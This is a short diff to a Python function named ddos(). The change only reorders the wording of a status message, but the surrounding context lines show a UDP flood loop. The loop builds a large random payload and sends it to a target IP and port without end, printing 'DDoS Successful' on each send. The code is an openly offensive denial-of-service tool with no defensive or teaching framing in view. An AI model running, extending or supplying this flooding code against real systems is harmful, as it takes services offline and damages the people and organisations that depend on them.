@@ -15,7 +15,7 @@ def ddos():
         payload = random._urandom(random.randint(32768, 65536)) * random.randint(500, 1000)
         while True:
             sock.sendto(payload, (target_ip, target_ports))
-            print("[*] DDoS Successful for: ( IP:", target_ip, "Port:", "|", target_ports, ")")
+            print("[*] DDoS Successful for: ( IP:", target_ip, "|", "Port:", target_ports, ")")
     except KeyboardInterrupt:
         print("[!] DDoS Exit")
     except Exception as e:
